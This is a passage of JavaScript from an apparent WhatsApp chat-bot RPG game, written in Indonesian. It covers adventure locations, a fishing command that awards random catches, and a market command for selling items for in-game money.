      let adv = `---------- Â» *ADVENTURE* Â« ----------\n\n*ğŸ“ ${text}*\n  ${vircion} â€¢ Kayu: ${kayu}\n  ${vircion} â€¢ Besi: ${besi}\n  ${vircion} â€¢ Rank: ${rank}\n  ${vircion} â€¢ Emerald: ${emerald}\n  ${vircion} â€¢ Perak: ${perak}\n  ${vircion} â€¢ Mythic: ${mythic}\n  ${vircion} â€¢ Uang: Rp ${saldo}\n\n*Stamina berkurang -55*`
      await sock.sendMessage(m.chat, { text: adv, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG - ADVENTURE", body: 'Adventure exploring the world', thumbnailUrl: thumbadv, sourceUrl: "tes", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
      global.db.erpg[m.sender].kayu += kayu
      global.db.erpg[m.sender].besi += besi
      global.db.erpg[m.sender].rank += rank
      db.users[m.sender].saldo += saldo
      global.db.erpg[m.sender].emerald += emerald
      global.db.erpg[m.sender].perak += perak
      global.db.erpg[m.sender].mythic += mythic
    } else if (tuju === "dark abyss") {
      global.db.erpg[m.sender].darahuser -= 70
      let thumbadv = "https://telegra.ph/file/e46f1188841f2e285e5dc-b6e1799986b286d808.jpg"
      let { key } = await sock.sendMessage(m.chat, { text: 'Berpetualang, Mohon Tunggu...' }, { quoted: fakeQuoted })
      await sleep(3000)
      await sock.sendMessage(m.chat, { text: `Kamu bertemu dengan ${obje}`, edit: key })
      await sleep(5000)
      await sock.sendMessage(m.chat, { text: `Menjelajah...`, edit: key })
      await sleep(3000)
      let adv = `---------- Â» *ADVENTURE* Â« ----------\n\n*ğŸ“ ${text}*\n  ${vircion} â€¢ Kayu: ${kayu}\n  ${vircion} â€¢ Besi: ${besi}\n  ${vircion} â€¢ Rank: ${rank}\n  ${vircion} â€¢ Emerald: ${emerald}\n  ${vircion} â€¢ Perak: ${perak}\n  ${vircion} â€¢ Besi: ${besi}\n  ${vircion} â€¢ Mythic: ${mythic}\n  ${vircion} â€¢ Uncommon: ${uncommon}\n  ${vircion} â€¢ Common: ${common}\n  ${vircion} â€¢ Legendary: ${legendary}\n  ${vircion} â€¢ Diamond: ${diamond}\n  ${vircion} â€¢ Uang: Rp ${saldo}\n\n*Stamina berkurang -70*`
      await sock.sendMessage(m.chat, { text: adv, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG - ADVENTURE", body: 'Adventure exploring the world', thumbnailUrl: thumbadv, sourceUrl: "tes", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
      global.db.erpg[m.sender].kayu += kayu
      global.db.erpg[m.sender].besi += besi
      global.db.erpg[m.sender].rank += rank
      db.users[m.sender].saldo += saldo
      global.db.erpg[m.sender].emerald += emerald
      global.db.erpg[m.sender].perak += perak
      global.db.erpg[m.sender].mythic += mythic
      global.db.erpg[m.sender].uncommon += uncommon
      global.db.erpg[m.sender].common += common
      global.db.erpg[m.sender].besi += besi
      global.db.erpg[m.sender].diamond += diamond
      global.db.erpg[m.sender].legendary += legendary
    } else if (tuju === "sacred altar") {
      global.db.erpg[m.sender].darahuser -= 70
      let thumbadv = "https://telegra.ph/file/2ffa90f11d36532a7b698-8dc80a97f65d8846a2.jpg"
      let { key } = await sock.sendMessage(m.chat, { text: 'Berpetualang, Mohon Tunggu...' }, { quoted: fakeQuoted })
      await sleep(3000)
      await sock.sendMessage(m.chat, { text: `Kamu bertemu dengan ${obje}`, edit: key })
      await sleep(5000)
      await sock.sendMessage(m.chat, { text: `Menjelajah...`, edit: key })
      await sleep(3000)
      let adv = `---------- Â» *ADVENTURE* Â« ----------\n\n*ğŸ“ ${text}*\n  ${vircion} â€¢ Kayu: ${kayu}\n  ${vircion} â€¢ Besi: ${besi}\n  ${vircion} â€¢ Rank: ${rank}\n  ${vircion} â€¢ Emerald: ${emerald}\n  ${vircion} â€¢ Perak: ${perak}\n  ${vircion} â€¢ Besi: ${besi}\n  ${vircion} â€¢ Mythic: ${mythic}\n  ${vircion} â€¢ Uncommon: ${uncommon}\n  ${vircion} â€¢ Common: ${common}\n  ${vircion} â€¢ Legendary: ${legendary}\n  ${vircion} â€¢ Diamond: ${diamond}\n  ${vircion} â€¢ Uang: Rp ${saldo}\n\n*Stamina berkurang -70*`
      await sock.sendMessage(m.chat, { text: adv, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG - ADVENTURE", body: 'Adventure exploring the world', thumbnailUrl: thumbadv, sourceUrl: "tes", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
      global.db.erpg[m.sender].kayu += kayu
      global.db.erpg[m.sender].besi += besi
      global.db.erpg[m.sender].rank += rank
      db.users[m.sender].saldo += saldo
      global.db.erpg[m.sender].emerald += emerald
      global.db.erpg[m.sender].perak += perak
      global.db.erpg[m.sender].mythic += mythic
      global.db.erpg[m.sender].uncommon += uncommon
      global.db.erpg[m.sender].common += common
      global.db.erpg[m.sender].besi += besi
      global.db.erpg[m.sender].diamond += diamond
      global.db.erpg[m.sender].legendary += legendary
    } else if (tuju === "infinity gate") {
      global.db.erpg[m.sender].darahuser -= 97
      let thumbadv = "https://telegra.ph/file/9468ed2e8c321ae27c92f-c32f8bf1a3394ea80e.jpg"
      let { key } = await sock.sendMessage(m.chat, { text: 'Berpetualang, Mohon Tunggu...' }, { quoted: fakeQuoted })
      await sleep(3000)
      await sock.sendMessage(m.chat, { text: `Kamu bertemu dengan ${obje}`, edit: key })
      await sleep(5000)
      await sock.sendMessage(m.chat, { text: `Menjelajah...`, edit: key })
      await sleep(3000)
      let adv = `---------- Â» *ADVENTURE* Â« ----------\n\n*ğŸ“ ${text}*\n  ${vircion} â€¢ Kayu: ${kayu}\n  ${vircion} â€¢ Besi: ${besi}\n  ${vircion} â€¢ Rank: ${rank}\n  ${vircion} â€¢ Emerald: ${emerald}\n  ${vircion} â€¢ Perak: ${perak}\n  ${vircion} â€¢ Besi: ${besi}\n  ${vircion} â€¢ Mythic: ${mythic}\n  ${vircion} â€¢ Uncommon: ${uncommon}\n  ${vircion} â€¢ Common: ${common}\n  ${vircion} â€¢ Legendary: ${legendary}\n  ${vircion} â€¢ Diamond: ${diamond}\n  ${vircion} â€¢ Uang: Rp ${saldo}\n\n*Stamina berkurang -97*`
      await sock.sendMessage(m.chat, { text: adv, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG - ADVENTURE", body: 'Adventure exploring the world', thumbnailUrl: thumbadv, sourceUrl: "tes", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
      global.db.erpg[m.sender].kayu += kayu
      global.db.erpg[m.sender].besi += besi
      global.db.erpg[m.sender].rank += rank
      db.users[m.sender].saldo += saldo
      global.db.erpg[m.sender].emerald += emerald
      global.db.erpg[m.sender].perak += perak
      global.db.erpg[m.sender].mythic += mythic
      global.db.erpg[m.sender].uncommon += uncommon
      global.db.erpg[m.sender].common += common
      global.db.erpg[m.sender].besi += besi
      global.db.erpg[m.sender].diamond += diamond
      global.db.erpg[m.sender].legendary += legendary
    } else {
      let thumbadv = "https://telegra.ph/file/6b9482a4ed6bd79c7a03e.jpg"
      let adv = `---------- Â» *ADVENTURE* Â« ----------\n\n*Pilih Lokasi JelajahmuğŸ“*\n  ${vircion} â€¢ savanah\n  ${vircion} â€¢ dessert\n  ${vircion} â€¢ boreal forest\n  ${vircion} â€¢ tropical forest\n  ${vircion} â€¢ underground\n  ${vircion} â€¢ shadownland\n  ${vircion} â€¢ dragons peak\n  ${vircion} â€¢ dark abyss (High)\n  ${vircion} â€¢ sacred altar (High)\n  ${vircion} â€¢ infinity gate (High)\n\n*Contoh:*\n.adventure dragons peak`
      await sock.sendMessage(m.chat, { text: adv, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG - ADVENTURE", body: 'Adventure exploring the world', thumbnailUrl: thumbadv, sourceUrl: "tes", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    }
    break
  }

  case 'memancing':
  case 'mancing': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (global.db.erpg[m.sender].stamina < 1) return reply('Stamina Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan')
    let ikan = await randomNomor(0, 20)
    let ikangurita = await randomNomor(0, 15)
    let ikancumi = await randomNomor(0, 13)
    let ikanbuntal = await randomNomor(0, 20)
    let ikanlobster = await randomNomor(0, 30)
    let ikanhiu = await randomNomor(0, 2)
    global.db.erpg[m.sender].ikan += ikan
    global.db.erpg[m.sender].gurita += ikangurita
    global.db.erpg[m.sender].cumi += ikancumi
    global.db.erpg[m.sender].buntal += ikanbuntal
    global.db.erpg[m.sender].lobster += ikanlobster
    global.db.erpg[m.sender].hiu += ikanhiu
    global.db.erpg[m.sender].darahuser -= 20
    let thum = ["https://telegra.ph/file/9b1f618a826fe7b3bed3e.jpg", "https://telegra.ph/file/2e772e9732c88e153e812.jpg", "https://telegra.ph/file/872b36a0dd7b6843f24da.jpg", "https://telegra.ph/file/562adf3d43cde4d355e76.jpg", "https://telegra.ph/file/7d641d46e96e9aace01dd.jpg"]
    let thumn = await pickRandom(thum)
    let { key } = await sock.sendMessage(m.chat, { text: 'Sedang Memancing...' }, { quoted: fakeQuoted })
    await sleep(5000)
    await sock.sendMessage(m.chat, { text: `Memperoleh Hasil...`, edit: key })
    await sleep(5000)
    let txt = `--------- Â» *MEMANCING* Â« ---------\n\nBerhasil mendapatkan :\n  ${vircion} â€¢ ikan: ${ikan}\n  ${vircion} â€¢ gurita: ${ikangurita}\n  ${vircion} â€¢ cumi: ${ikancumi}\n  ${vircion} â€¢ buntal: ${ikanbuntal}\n  ${vircion} â€¢ lobster: ${ikanlobster}\n  ${vircion} â€¢ hiu: ${ikanhiu}\n\n_Stamina berkurang -20_`
    sock.sendMessage(m.chat, { text: txt, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG - FISHING", body: 'Looking for fish catch', thumbnailUrl: thumn, sourceUrl: "tes", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    break
  }

  case 'sell':
  case 'jual': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (text.includes('-')) return reply('Nominal Tidak valid!!')
    let jual = args[0]
    switch (jual) {
      case 'emas':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 20500)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].emas}` < `${jumlh}`) return reply(`*Emas Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].emas -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Emas: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'besi':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang2 = Number(parseInt(args[1]) * 1500)
        let jumlh2 = Number(args[1])
        if (`${global.db.erpg[m.sender].besi}` < `${jumlh2}`) return reply(`*Besi Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang2
        global.db.erpg[m.sender].besi -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Besi: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang2}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'batubara':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang3 = Number(parseInt(args[1]) * 1000)
        let jumlh3 = Number(args[1])
        if (`${global.db.erpg[m.sender].batubara}` < `${jumlh3}`) return reply(`*Batu Bara Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang3
        global.db.erpg[m.sender].batubara -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Batu Bara: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang3}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'perak':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang4 = Number(parseInt(args[1]) * 2000)
        let jumlh4 = Number(args[1])
        if (`${global.db.erpg[m.sender].perak}` < `${jumlh4}`) return reply(`*Perak Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang4
        global.db.erpg[m.sender].perak -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Perak: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang4}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'kayu':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang5 = Number(parseInt(args[1]) * 500)
        let jumlh5 = Number(args[1])
        if (`${global.db.erpg[m.sender].kayu}` < `${jumlh5}`) return reply(`*Kayu Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang5
        global.db.erpg[m.sender].kayu -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Kayu: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang5}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'ayam':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang6 = Number(parseInt(args[1]) * 500)
        let jumlh6 = Number(args[1])
        if (`${global.db.erpg[m.sender].ayam}` < `${jumlh6}`) return reply(`*Ayam Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang6
        global.db.erpg[m.sender].ayam -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Ayam: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang6}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'sapi':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang7 = Number(parseInt(args[1]) * 3000)
        let jumlh7 = Number(args[1])
        if (`${global.db.erpg[m.sender].sapi}` < `${jumlh7}`) return reply(`*Sapi Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang7
        global.db.erpg[m.sender].sapi -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Sapi: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang7}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'domba':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang8 = Number(parseInt(args[1]) * 2000)
        let jumlh8 = Number(args[1])
        if (`${global.db.erpg[m.sender].domba}` < `${jumlh8}`) return reply(`*Domba Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang8
        global.db.erpg[m.sender].domba -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Domba: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang8}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'ikan':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang9 = Number(parseInt(args[1]) * 200)
        let jumlh9 = Number(args[1])
        if (`${global.db.erpg[m.sender].ikan}` < `${jumlh9}`) return reply(`*Ikan Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang9
        global.db.erpg[m.sender].ikan -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Ikan: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang9}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'rumah':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang10 = Number(parseInt(args[1]) * 200000)
        let jumlh10 = Number(args[1])
        if (`${global.db.erpg[m.sender].rumah}` < `${jumlh10}`) return reply(`*Rumah Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang10
        global.db.erpg[m.sender].rumah -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ rumah: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang10}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'emerald':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang11 = Number(parseInt(args[1]) * 20000)
        let jumlh11 = Number(args[1])
        if (`${global.db.erpg[m.sender].emerald}` < `${jumlh11}`) return reply(`*Emerald Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang11
        global.db.erpg[m.sender].emerald -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Emerald: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang11}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'diamond':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang12 = Number(parseInt(args[1]) * 50000)
        let jumlh12 = Number(args[1])
        if (`${global.db.erpg[m.sender].diamond}` < `${jumlh12}`) return reply(`*Diamond Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang12
        global.db.erpg[m.sender].diamond -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Diamond: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang12}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'botol':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang13 = Number(parseInt(args[1]) * 200)
        let jumlh13 = Number(args[1])
        if (`${global.db.erpg[m.sender].botol}` < `${jumlh13}`) return reply(`*Botol Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang13
        global.db.erpg[m.sender].botol -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Botol: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang13}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'kardus':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang14 = Number(parseInt(args[1]) * 200)
        let jumlh14 = Number(args[1])
        if (`${global.db.erpg[m.sender].kardus}` < `${jumlh14}`) return reply(`*Kardus Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang14
        global.db.erpg[m.sender].kardus -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Kardus: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang14}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'kaleng':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang15 = Number(parseInt(args[1]) * 200)
        let jumlh15 = Number(args[1])
        if (`${global.db.erpg[m.sender].kaleng}` < `${jumlh15}`) return reply(`*Kaleng Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang15
        global.db.erpg[m.sender].kaleng -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Kaleng: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Kaleng: ${uang15}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'gelas':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang16 = Number(parseInt(args[1]) * 200)
        let jumlh16 = Number(args[1])
        if (`${global.db.erpg[m.sender].gelas}` < `${jumlh16}`) return reply(`*Gelas Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang16
        global.db.erpg[m.sender].gelas -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Gelas: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang16}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'plastik':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang17 = Number(parseInt(args[1]) * 200)
        let jumlh17 = Number(args[1])
        if (`${global.db.erpg[m.sender].plastik}` < `${jumlh17}`) return reply(`*Plastik Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang17
        global.db.erpg[m.sender].plastik -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Plastik: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang17}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'banteng':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang18 = Number(parseInt(args[1]) * 30000)
        let jumlh18 = Number(args[1])
        if (`${global.db.erpg[m.sender].banteng}` < `${jumlh18}`) return reply(`*Banteng Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang18
        global.db.erpg[m.sender].banteng -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Banteng: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang18}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'gajah':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang19 = Number(parseInt(args[1]) * 70000)
        let jumlh19 = Number(args[1])
        if (`${global.db.erpg[m.sender].gajah}` < `${jumlh19}`) return reply(`*Gajah Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang19
        global.db.erpg[m.sender].gajah -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Gajah: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang19}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'harimau':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang20 = Number(parseInt(args[1]) * 100000)
        let jumlh20 = Number(args[1])
        if (`${global.db.erpg[m.sender].harimau}` < `${jumlh20}`) return reply(`*Harimau Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang20
        global.db.erpg[m.sender].harimau -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Harimau: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang20}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'kambing':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang21 = Number(parseInt(args[1]) * 30000)
        let jumlh21 = Number(args[1])
        if (`${global.db.erpg[m.sender].kambing}` < `${jumlh21}`) return reply(`*Kambing Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang21
        global.db.erpg[m.sender].kambing -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Kambing: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang21}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'panda':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
